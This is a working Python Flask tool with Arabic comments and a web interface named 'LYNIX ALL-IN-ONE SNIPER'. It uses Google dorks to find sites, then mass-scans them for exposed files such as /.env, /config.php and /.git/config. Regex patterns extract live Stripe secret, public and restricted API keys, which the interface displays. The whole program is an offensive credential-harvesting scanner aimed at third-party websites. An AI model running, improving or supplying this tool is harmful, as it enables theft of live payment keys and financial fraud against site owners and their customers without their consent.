import os
import requests
import re
from flask import Flask, render_template_string, request, jsonify
from googlesearch import search
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# أنماط البحث عن مفاتيح Stripe بجميع صيغها
PATTERNS = {
    "Secret Key": r"sk_live_[a-zA-Z0-9]{24,}",
    "Public Key": r"pk_live_[a-zA-Z0-9]{24,}",
    "Restricted Key": r"rk_live_[a-zA-Z0-9]{24,}",
    "Env Format": r"(?:STRIPE|PAYMENT)_(?:SECRET|PUBLIC)_KEY\s*=\s*['\"]?(pk_live_|sk_live_)[a-zA-Z0-9]{24,}['\"]?"
}

# المسارات الحساسة للفحص السريع
SENSITIVE_PATHS = ['/.env', '/config.php', '/js/app.js', '/.git/config']

def extract_keys(text, source):
    results = []
    for label, pattern in PATTERNS.items():
        matches = re.findall(pattern, text)
        for match in matches:
            results.append({"type": label, "value": match, "source": source})
    return results

def deep_scan_site(url):
    findings = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'}
    
    # 1. فحص الملفات الحساسة
    for path in SENSITIVE_PATHS:
        try:
            target = urljoin(url, path)
            res = requests.get(target, headers=headers, timeout=5, verify=False)
            if res.status_code == 200:
                findings.extend(extract_keys(res.text, target))
        except: continue
        
    # 2. فحص الصفحة الرئيسية
    try:
        res = requests.get(url, headers=headers, timeout=7, verify=False)
        if res.status_code == 200:
            findings.extend(extract_keys(res.text, url))
    except: pass
    
    return findings

@app.route('/')
def index():
    return render_template_string(HTML_UI)

@app.route('/hunt', methods=['POST'])
def hunt():
    dork = request.json.get('dork')
    limit = int(request.json.get('limit', 20))
    
    # الخطوة 1: استخراج المواقع (Dorking)
    links = []
    try:
        for url in search(dork, num_results=limit):
            links.append(url)
    except Exception as e:
        return jsonify({"status": "error", "message": f"Dorking failed: {str(e)}"})

    # الخطوة 2: الفحص الجماعي (Mass Scanning)
    final_results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(deep_scan_site, url): url for url in links}
        for future in future_to_url:
            url = future_to_url[future]
            try:
                keys = future.result()
                final_results.append({"url": url, "keys": keys, "status": "scanned"})
            except:
                final_results.append({"url": url, "keys": [], "status": "failed"})

    return jsonify({"status": "success", "results": final_results})

HTML_UI = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX ALL-IN-ONE HUNTER</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .box { max-width: 1100px; margin: auto; border: 1px solid #0f0; padding: 20px; background: #050505; }
        input, button { padding: 12px; margin: 5px; border-radius: 4px; }
        input { width: 60%; background: #111; border: 1px solid #0f0; color: #fff; }
        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; border: none; }
        .result-item { border-bottom: 1px solid #222; padding: 10px; text-align: left; }
        .key-found { color: yellow; background: #1a1a00; padding: 2px 5px; border-radius: 3px; }
        #log { height: 400px; overflow-y: scroll; border: 1px solid #333; margin-top: 20px; padding: 10px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>[ LYNIX ALL-IN-ONE SNIPER V43 ]</h1>
        <p>البحث والفحص الجماعي المستمر (Dork + Deep Scan)</p>
        <input type="text" id="dorkInput" placeholder="ضع الـ Dork هنا... مثال: filetype:env sk_live">
        <button onclick="startHunter()">إطلاق العملية ⚡</button>
        <div id="log">بانتظار إدخال الدورك...</div>
    </div>

    <script>
        async function startHunter() {
            const dork = document.getElementById('dorkInput').value;
            const logArea = document.getElementById('log');
            logArea.innerHTML = "<div>⏳ جاري استخراج المواقع من محركات البحث وفحصها شبر شبر...</div>";

            try {
                const response = await fetch('/hunt', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ dork: dork, limit: 30 })
                });
                const data = await response.json();
                
                if(data.status === "success") {
                    logArea.innerHTML = "";
                    data.results.forEach(res => {
                        let keysHtml = res.keys.map(k => `<div class='key-found'>[${k.type}] ${k.value} (في: ${k.source})</div>`).join('');
                        logArea.innerHTML += `<div class='result-item'>
                            <span style='color:#00bcff;'>[URL]: ${res.url}</span><br>
                            ${res.keys.length > 0 ? keysHtml : "<span style='color:#555;'>[!] لم يتم العثور على مفاتيح مكشوفة</span>"}
                        </div>`;
                    });
                }
            } catch(e) { logArea.innerHTML = "❌ خطأ في الاتصال بالسيرفر"; }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
